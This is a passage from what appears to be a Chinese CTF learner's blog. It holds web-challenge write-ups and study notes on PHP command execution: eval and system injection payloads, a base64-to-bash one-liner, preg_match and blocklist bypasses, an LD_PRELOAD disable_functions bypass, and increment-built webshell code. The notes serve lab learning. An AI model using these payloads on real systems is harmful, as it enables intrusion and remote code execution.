class="hljs-string">&#x27;flag&#x27;</span>)&#123;　 <span class="hljs-regexp">//</span>传入的变量为flag   value不是flag        <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$handsome</span>);    &#125;&#125;<span class="hljs-keyword">if</span>(!isset(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]) &amp;&amp; !isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]))&#123;      <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$yds</span>);&#125;<span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span>  || <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span>)&#123;       <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$is</span>);&#125;echo <span class="hljs-string">&quot;the flag is: &quot;</span>.<span class="hljs-variable">$flag</span>;</code></pre></div><p>明显的变量覆盖，想着能不能到最后echo输出，但发现好像不行，只好利用exit</p><p>有三种方法（网上直接抄了）</p><div class="code-wrapper"><pre><code class="hljs routeros">?<span class="hljs-attribute">yds</span>=flag  ?<span class="hljs-attribute">is</span>=flag&amp;flag=flag?<span class="hljs-attribute">handsome</span>=flag&amp;flag=x&amp;x=flag</code></pre></div><h1 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h1><p>hint提示看cookie</p><p>flag.php 输出什么回显什么，猜测ssti</p><p>查看后端是php</p><p>经过尝试后是twig（自己sbb的存的payload忘记怎么用了，看了wp才反应过来）</p><p>然后成功命令执行</p><p>但是发现回显只有一个，就当我困惑时，尝试了<code>cat /etc/passwd</code> 是<code>nginx</code>，而我们的用户是<code>www-data</code> ，所以知道只是输出受限制了</p><p>但我思路仍然受阻，看了眼WP，<code>cat /flag</code> 。。。。。。。。。。。。</p><h1 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h1><p>看url，有img和cmd，cmd禁用很多，从img入手，把编码拿到cyberchef，直接还原（看别人也有解不出来这个的）</p><p>我在编码时也被坑了一下，base64换了一个符号，hex要调为None</p><p>然后自然猜测flag.php(然后跳转，没什么用)，也试过其他后缀，都是跳转同一个地方，大概猜出有个正则匹配</p><p>其实没有东西读的时候，就读index.php，（因为看是图片，我sbb的构造index.png……….）</p><p>然后读出源码</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-title function_ invoke__">error_reporting</span>(E_ALL || ~ E_NOTICE);<span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);<span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img&#x27;</span>]) || !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]))     <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;</span>);<span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img&#x27;</span>])));<span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$file</span>);<span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$file</span>)) &#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;</span>;    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;xixiï½ no flag&quot;</span>);&#125; <span class="hljs-keyword">else</span> &#123;    <span class="hljs-variable">$txt</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>));    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . <span class="hljs-variable">$txt</span> . <span class="hljs-string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;&#125;<span class="hljs-keyword">echo</span> <span class="hljs-variable">$cmd</span>;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="hljs-variable">$cmd</span>)) &#123;    <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;forbid ~&quot;</span>);    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;&#125; <span class="hljs-keyword">else</span> &#123;    <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>] !== (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>])) &#123;        <span class="hljs-keyword">echo</span> `<span class="hljs-variable">$cmd</span>`;    &#125; <span class="hljs-keyword">else</span> &#123;        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;md5 is funny ~&quot;</span>);    &#125;&#125;<span class="hljs-meta">?&gt;</span>&lt;html&gt;&lt;style&gt;  body&#123;   background:<span class="hljs-title function_ invoke__">url</span>(./bj.png)  no-repeat center center;   background-size:cover;   background-attachment:fixed;   background-color:<span class="hljs-comment">#CCCCCC;</span>&#125;&lt;/style&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;</code></pre></div><h2 id="string-POST-‘a’-string-POST-‘b’-md5-POST-‘a’-md5-POST-‘b’"><a href="#string-POST-‘a’-string-POST-‘b’-md5-POST-‘a’-md5-POST-‘b’" class="headerlink" title="(string)$POST[‘a’] !&#x3D;&#x3D; (string)$POST[‘b’] &amp;&amp; md5($POST[‘a’]) &#x3D;&#x3D;&#x3D; md5($POST[‘b’])"></a>(string)$POST[‘a’] !&#x3D;&#x3D; (string)$POST[‘b’] &amp;&amp; md5($POST[‘a’]) &#x3D;&#x3D;&#x3D; md5($POST[‘b’])</h2><p>猜的八九不离十，关键是</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">else</span> &#123;    <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>] !== (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>])) &#123;        <span class="hljs-keyword">echo</span> `<span class="hljs-variable">$cmd</span>`;    &#125; <span class="hljs-keyword">else</span> &#123;        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;md5 is funny ~&quot;</span>);    &#125;&#125;</code></pre></div><p>我把数组和MD5碰撞都试了，发现没用。。。。</p><p>看了wp，没错啊是md5碰撞，重新开网页测试，成功了。。。。。。。。。。。</p><h1 id="BUU-BURP-COURSE-1"><a href="#BUU-BURP-COURSE-1" class="headerlink" title="BUU BURP COURSE 1"></a>BUU BURP COURSE 1</h1><div class="code-wrapper"><pre><code class="hljs">只允许本地访问</code></pre></div><p>考察HTTP请求头</p><p>X-Forwarded-For      Client-Ip     X-Real-IP</p><p>这里要使用X-Real-IP</p><p>，然后是个登录框，使用post请求带上参数即可</p><h2 id="X-Forwarded-For与X-Real-IP区别"><a href="#X-Forwarded-For与X-Real-IP区别" class="headerlink" title="X-Forwarded-For与X-Real-IP区别"></a>X-Forwarded-For与X-Real-IP区别</h2><p>X-Forwarded-For能记录完整的多级代理</p><p>X-Real-IP只有一个值</p><p>所以 ，如果只有一层代理，这两个头的值就是一样的</p><p>多级代理很少见，只有一级代理的情况下二者是等效的</p><p>如果有多级代理，x-forwarded-for效果是大于x-real-ip的，可以记录完整的代理链路</p><div class="code-wrapper"><pre><code class="hljs cobol">来自`4.4.4.4`的一个请求，header包含这样一行X-Forwarded-For: 1.1.1.1, 2.2.2.2, 3.3.3.3      代表 请求由`1.1.1.1`发出，经过三层代理，第一层是`2.2.2.2`，第二层是`3.3.3.3`，而本次请求的来源IP`4.4.4.4`是第三层代理</code></pre></div><div class="code-wrapper"><pre><code class="hljs csharp">而`X-Real-IP`，没有相关标准，上面的例子，如果配置了`X-Read-IP`，可能会有两种情况<span class="hljs-comment">// 最后一跳是正向代理，可能会保留真实客户端IP</span>X-Real-IP: <span class="hljs-number">1.1</span><span class="hljs-number">.1</span><span class="hljs-number">.1</span><span class="hljs-comment">// 最后一跳是反向代理，比如Nginx，一般会是与之直接连接的客户端IP X-Real-IP: 3.3.3.3</span>    如果用户访问你的 nginx反向代理之前，还经过了一层正向代理，你即使在nginx中配置了x-real-ip，取到的也只是正向代理的IP而不是客户端真实IP</code></pre></div>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>disable_function</title>
    <link href="/2023/09/06/disable-function/"/>
    <url>/2023/09/06/disable-function/</url>
    
    <content type="html"><![CDATA[<p>网上搜了一下，大概考点应该是disable_function绕过，网上给的脚本大多是先通过蚁剑连接再上传so文件进行绕过。但是查看了一下网站根目录，发现一个<code>.antproxy.php</code>,问了hurrison说是反制蚁剑连接的。</p><p>也就是说没办法蚁剑连接。查看权限，发现只有<code>/var/www/html</code> 是0755权限没有写文件权限，而其他路径都是0的权限，这道题势必要getshell执行系统命令才行了。</p><p>所以思路就是想办法上传文件，<strong>利用 LD_PRELOAD 环境变量</strong>来执行系统命令。</p><ul><li>执行<code>print_r(glob(&#39;/*&#39;));</code> 发现<code>/tmp</code>目录，进入里面还有其他选手留下的脚本（</li><li>所以思路是向<code>/tmp</code>目录下面写文件，利用文件包含getshell</li></ul><p>参考 <a href="https://www.freebuf.com/articles/network/263540.html">https://www.freebuf.com/articles/network/263540.html</a></p><p>原理：</p><blockquote><p>利用漏洞控制 web 启动新进程 a.bin（即便进程名无法让我随意指定），新进程 a.bin 内部调用系统函数 b()，b() 位于 系统共享对象 c.so 中，所以系统为该进程加载共享对象 <a href="http://c.so/">c.so</a>，想办法在加载 c.so 前优先加载可控的 c_evil.so，c_evil.so 内含与 b() 同名的恶意函数，由于 c_evil.so 优先级较高，所以，a.bin 将调用到 c_evil.so 内的b() 而非系统的 <a href="http://c.so/">c.so</a> 内 b()，同时，c_evil.so 可控，达到执行恶意代码的目的。</p></blockquote><p>想要利用LD_PRELOAD环境变量绕过disable_functions需要注意以下几点：</p><blockquote><p>能够上传自己的.so文件</p><p>能够控制LD_PRELOAD环境变量的值，比如putenv()函数</p><p>因为新进程启动将加载LD_PRELOAD中的.so文件，所以要存在可以控制PHP启动外部程序的函数并能执行，比如mail()、imap_mail()、mb_send_mail()和error_log()函数等</p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>插曲</title>
    <link href="/2023/09/03/%E6%8F%92%E6%9B%B2/"/>
    <url>/2023/09/03/%E6%8F%92%E6%9B%B2/</url>
    
    <content type="html"><![CDATA[<p>前几天网站被发现了，Boogipop大佬找到tel✌来找人</p><p><img src="/2023/09/03/%E6%8F%92%E6%9B%B2/20230903175855.jpg"></p><p><img src="/2023/09/03/%E6%8F%92%E6%9B%B2/image-20230902172136084.png"></p><p>在烧卖有点社死（虽然我那时已经睡了，第二天看的信息），但被大佬关注到还是挺荣幸的</p><p>同时感觉学习更有动力、更有目标了（不知道这种状态能坚持多久）</p><p>在这期间还是多刷题吧，看完<code>Boogipop</code>的新人同学挺有收获，但是当脱离了文章，去回想学了什么时，只有一些模糊的记忆，还是通过刷题的印象更加深刻，更何况看到了大佬写的一堆<code>ctfshow</code>的题目</p><p>😁😁😁😁😁😁😁😀😀😀😀😀😀😀</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>读Boogipop新人同学</title>
    <link href="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/"/>
    <url>/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/</url>
    
    <content type="html"><![CDATA[<h1 id="读Boogipop大佬文章的具体尝试"><a href="#读Boogipop大佬文章的具体尝试" class="headerlink" title="读Boogipop大佬文章的具体尝试"></a>读Boogipop大佬文章的具体尝试</h1><h2 id="1-关于eval和system-（只尝试了php7-3-4）"><a href="#1-关于eval和system-（只尝试了php7-3-4）" class="headerlink" title="1.关于eval和system   （只尝试了php7.3.4）"></a>1.关于eval和system   （只尝试了php7.3.4）</h2><p>eval常规执行命令形如<code>eval(system(&#39;whoami&#39;););</code></p><p>当然不能直接这样运行，<code>system(&#39;whoami&#39;);</code>是传参进去的  （记得带<code>;</code>号）</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-comment">#大佬给出的绕过技巧</span><span class="hljs-keyword">eval</span>(<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>)<span class="hljs-meta">?&gt;</span>)<span class="hljs-keyword">eval</span>(<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<span class="hljs-meta">?&gt;</span>)<span class="hljs-keyword">eval</span>(<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<span class="hljs-meta">?&gt;</span>;)<span class="hljs-keyword">eval</span>(<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?</span>)<span class="hljs-keyword">eval</span>(<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?php</span>;)</code></pre></div><h3 id="在拼接的情况下执行命令"><a href="#在拼接的情况下执行命令" class="headerlink" title="在拼接的情况下执行命令"></a>在拼接的情况下执行命令</h3><h4 id="eval-中的参数被拼接"><a href="#eval-中的参数被拼接" class="headerlink" title="eval()中的参数被拼接"></a>eval()中的参数被拼接</h4><div class="code-wrapper"><pre><code class="hljs autoit"><span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;#&#x27;</span>.$_GET[<span class="hljs-string">&#x27;c&#x27;</span>])<span class="hljs-comment">;</span><span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;asd&#x27;</span>.$_GET[<span class="hljs-string">&#x27;c&#x27;</span>])<span class="hljs-comment">;</span><span class="hljs-built_in">eval</span>($_GET[<span class="hljs-string">&#x27;c&#x27;</span>].<span class="hljs-string">&quot;asd&quot;</span>)<span class="hljs-comment">;</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs mel">第一种: 注释考虑换行绕过      payload:?c=%0asystem(<span class="hljs-string">&#x27;ls&#x27;</span>);第二种: 考虑分割(; | &amp;)      payload:?c=;<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);第三种: 考虑注释后面内容      payload:?c=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<span class="hljs-comment">//</span>                          payload:?c=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);__HALT_COMPILER();</code></pre></div><h4 id="system-中的拼接"><a href="#system-中的拼接" class="headerlink" title="system()中的拼接"></a>system()中的拼接</h4><p>好像换行注释什么的都不行，只考虑命令拼接符</p><p>以下是个人尝试得出的结论，和网上的不同（有可能是windows环境的原因）(感觉我的都是歪理，其实有些地方也自相矛盾)</p><div class="code-wrapper"><pre><code class="hljs gherkin">;   理论上做题应该是万能的，但在本地尝试的时候,一点作用都没有|<span class="hljs-string">   只输出最后一个</span>|<span class="hljs-string">后的命令，若前面有一个命令是错误的，则无法执行</span><span class="hljs-string"></span>||<span class="hljs-string">  只执行</span>||<span class="hljs-string">前的命令，后面的命令错误不影响执行，若</span>||<span class="hljs-string">前的命令是错误的，后面的仍无法执行,     若前面的命令是curl、net(可能是没有输出结果的指令),就能够执行</span>||<span class="hljs-string">后面的语句</span><span class="hljs-string"></span><span class="hljs-string">&amp;   命令都正确时，都可以执行，后面的错了，前面的能执行，前面的错了，都不能执行</span><span class="hljs-string">&amp;&amp;  命令都正确时，都可以执行，后面的错了，前面的能执行，前面的错了，都不能执行</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs perl"><span class="hljs-keyword">system</span>(<span class="hljs-string">&quot;ls -all &quot;</span>.$this-&gt;filename);     <span class="hljs-comment">#DASCTF2023&amp;0X401比赛题</span><span class="hljs-keyword">system</span>($_GET[<span class="hljs-string">&#x27;file&#x27;</span>].<span class="hljs-string">&quot;aksldj&quot;</span>);<span class="hljs-keyword">system</span>(<span class="hljs-string">&quot;curl &quot;</span>.$_GET[<span class="hljs-string">&#x27;url&#x27;</span>].<span class="hljs-string">&quot;.dnslog.cn&quot;</span>);</code></pre></div><div class="code-wrapper"><pre><code class="hljs gherkin"><span class="hljs-comment">#由于;我无法尝试，此处不讨论;能否使用</span>第一个: 大佬payload: ;echo bHMgLwo|<span class="hljs-string">base64 -d</span>|<span class="hljs-string">bash;    题目复现过，是可行的</span><span class="hljs-string">第二个: </span>||<span class="hljs-string">  &amp;  &amp;&amp; 三个都能使用</span><span class="hljs-string">第三个: 由于是curl,前面可以使用</span>||<span class="hljs-string">(直接</span>|<span class="hljs-string">也行),后面</span>||<span class="hljs-string">  &amp;  &amp;&amp; 三个都能使用</span></code></pre></div><h2 id="data协议和input协议与include和highlight-file"><a href="#data协议和input协议与include和highlight-file" class="headerlink" title="data协议和input协议与include和highlight_file"></a>data协议和input协议与include和highlight_file</h2><blockquote><p>data协议条件</p><ul><li>allow_url_fopen:on</li><li>allow_url_include :on</li></ul><p>input协议条件</p><ul><li>allow_url_fopen:随便</li><li>allow_url_include :on</li></ul></blockquote><p>关于include能执行命令，我是模糊的，一直到2023SCTF的<code>fumo_backdoor</code>（与2022CISCN的考点相同），他们之间的区别是一个是include、一个是highlight_file（与题目的考点无关，但确实会对题目中的操作有影响），我在复现时看文章能写木马，但复现却不行，问了<code>unknown</code>师傅才知道，能执行代码完全靠的是<code>include</code>的函数，而<code>highlight_file</code>这类的就完全不行！</p><p><code>include</code>能配合<code>data</code>、<code>input</code>伪协议进行命令执行，而<code>highlight_file</code>显示代码</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);&#125;<span class="hljs-keyword">else</span>&#123;    <span class="hljs-title function_ invoke__">highlight_file</span>(__file__);&#125;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]))&#123;    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]);&#125;<span class="hljs-meta">?&gt;</span></code></pre></div><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230901162551316.png" alt="image-20230901162551316"></p><h3 id="filter协议就不说了"><a href="#filter协议就不说了" class="headerlink" title="filter协议就不说了"></a>filter协议就不说了</h3><h3 id="Boogipop大佬总结"><a href="#Boogipop大佬总结" class="headerlink" title="Boogipop大佬总结"></a>Boogipop大佬总结</h3><p>所谓的什么伪协议流，其实就是读取文件或者写入内容到文件，并且储存到变量里面<br>不要搞混了哦</p><h2 id="preg-match误区"><a href="#preg-match误区" class="headerlink" title="preg_match误区"></a>preg_match误区</h2><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <span class="hljs-variable">$str</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^flag/i&#x27;</span>, <span class="hljs-variable">$str</span>))&#123; <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;yes&#x27;</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre></div><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230901170008293.png" alt="image-20230901170008293"></p><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230901165657391.png" alt="image-20230901165657391"></p><p>完了，为什么啊，与大佬结果不一样，（我测试了7.3.4和7.0.9和5.6.9三个版本都不回显）</p><h3 id="m修饰符"><a href="#m修饰符" class="headerlink" title="m修饰符"></a>m修饰符</h3><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230901171700257.png" alt="image-20230901171700257"></p><p><code>m</code>是一定要搭配<code>^</code>或者<code>$</code>来使用的，匹配的是**<code>每一行</code>**的开头或结尾</p><div class="code-wrapper"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">if</span><span class="hljs-params">(preg_match(<span class="hljs-string">&#x27;/^flag/im&#x27;</span>, <span class="hljs-variable">$str</span>)</span></span>)&#123;</code></pre></div><p>所以无法用%0a进行绕过</p><h3 id="preg-match的绕过技巧"><a href="#preg-match的绕过技巧" class="headerlink" title="preg_match的绕过技巧"></a>preg_match的绕过技巧</h3><div class="code-wrapper"><pre><code class="hljs nginx"><span class="hljs-attribute">if</span> (preg_match(<span class="hljs-string">&#x27;/^flag$/&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>] !== <span class="hljs-string">&#x27;flag&#x27;</span>) &#123;    <span class="hljs-attribute">echo</span> <span class="hljs-variable">$flag</span>;&#125;</code></pre></div><p><code>?a=flag%0a</code></p><h4 id="数组绕过"><a href="#数组绕过" class="headerlink" title="数组绕过"></a>数组绕过</h4><h4 id="PCRE回溯次数限制绕过"><a href="#PCRE回溯次数限制绕过" class="headerlink" title="PCRE回溯次数限制绕过"></a>PCRE回溯次数限制绕过</h4><p>一般是写脚本上传超过1000000的数据，就会被绕过</p><h5 id="新了解的方法"><a href="#新了解的方法" class="headerlink" title="新了解的方法"></a>新了解的方法</h5><p><code>.htaccess</code>文件设置pcre回溯次数</p><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">php_value</span> pcre.backtrack_limit <span class="hljs-number">0</span><span class="hljs-attribute">php_value</span> pcre.jit <span class="hljs-number">0</span></code></pre></div><p>将正则匹配的回溯次数设为0，来达到绕过的效果</p><h4 id="限制次数绕过"><a href="#限制次数绕过" class="headerlink" title="限制次数绕过"></a>限制次数绕过</h4><p><code>preg_match(&#39;/[0-9a-zA-Z]&#123;2&#125;/&#39;,$p) === 1</code>（匹配到两次）</p><p>每一个字符前加上单引号可以绕过preg_match的匹配：                                      </p><p>payload：<code>p=&#39;Z&#39;m&#39;x&#39;h&#39;Z&#39;y&#39;5&#39;w&#39;a&#39;H&#39;A&#39;=</code></p><h2 id="parse-str"><a href="#parse-str" class="headerlink" title="parse_str"></a>parse_str</h2><p><img src="/2023/09/01/%E8%AF%BBBoogipop%E6%96%B0%E4%BA%BA%E5%90%8C%E5%AD%A6/image-20230901174857243.png" alt="image-20230901174857243"></p><p>根据<code>&amp;</code>解析变量</p><div class="code-wrapper"><pre><code class="hljs zephir">parse_str(<span class="hljs-string">&quot;a=1%26b=2%26c=3&quot;</span>);     <span class="hljs-string">&#x27;a&#x27;</span> =&gt; <span class="hljs-keyword">string</span> <span class="hljs-string">&#x27;1&amp;b=2&amp;c=3&#x27;</span>parse_str(<span class="hljs-string">&quot;a=1&amp;b=2&amp;c=3&quot;</span>);<span class="hljs-string">&#x27;a&#x27;</span> =&gt; <span class="hljs-keyword">string</span> <span class="hljs-string">&#x27;1&#x27;</span><span class="hljs-string">&#x27;b&#x27;</span> =&gt; <span class="hljs-keyword">string</span> <span class="hljs-string">&#x27;2&#x27;</span><span class="hljs-string">&#x27;c&#x27;</span> =&gt; <span class="hljs-keyword">string</span> <span class="hljs-string">&#x27;3&#x27;</span></code></pre></div><h2 id="无参数RCE"><a href="#无参数RCE" class="headerlink" title="无参数RCE"></a>无参数RCE</h2><p>取反、异或都需要php7的环境（确实好像php5用不了）</p><h4 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h4><p>大佬给出的异或脚本真好用，嘿嘿</p><h4 id="取反"><a href="#取反" class="headerlink" title="取反"></a>取反</h4><p>php取反很方便</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-string">&#x27;phpinfo&#x27;</span>);<span class="hljs-meta">?&gt;</span></code></pre></div><h4 id="自增"><a href="#自增" class="headerlink" title="自增"></a>自增</h4><p><code>[].[]</code>返回ArrayArray          <code>_/_</code>返回NAN</p><p>由此自增构造字符</p><div class="code-wrapper"><pre><code class="hljs ruby"><span class="hljs-variable">$%</span><span class="hljs-variable constant_">DF</span>=(_/_._)[<span class="hljs-string">&#x27;!&#x27;</span>==<span class="hljs-string">&#x27;_&#x27;</span>];<span class="hljs-regexp">//</span><span class="hljs-variable constant_">NAN</span><span class="hljs-variable">$_</span>=++<span class="hljs-variable">$%</span><span class="hljs-variable constant_">DF</span>;    <span class="hljs-regexp">//</span>O<span class="hljs-variable">$%</span><span class="hljs-variable constant_">DE</span>=_;     <span class="hljs-regexp">//</span>_<span class="hljs-variable">$%</span><span class="hljs-variable constant_">DE</span>.=++<span class="hljs-variable">$_</span>.<span class="hljs-variable">$%</span><span class="hljs-variable constant_">DF</span>;   <span class="hljs-regexp">//</span>_P<span class="hljs-variable">$_</span>++;   <span class="hljs-regexp">//</span>Q<span class="hljs-variable">$_</span>++;    <span class="hljs-regexp">//</span>R<span class="hljs-variable">$%</span><span class="hljs-variable constant_">DE</span>.=++<span class="hljs-variable">$_</span>;   <span class="hljs-regexp">//</span>_POS<span class="hljs-variable">$%</span><span class="hljs-variable constant_">DE</span>.=++<span class="hljs-variable">$_</span>;   <span class="hljs-regexp">//</span>_POST<span class="hljs-variable">$$</span>%<span class="hljs-variable constant_">DE</span>[__](<span class="hljs-variable">$$</span>%<span class="hljs-variable constant_">DE</span>[_]);  <span class="hljs-regexp">//</span><span class="hljs-variable">$_POST</span>[__](<span class="hljs-variable">$_POST</span>[_])</code></pre></div><div class="code-wrapper"><pre><code class="hljs 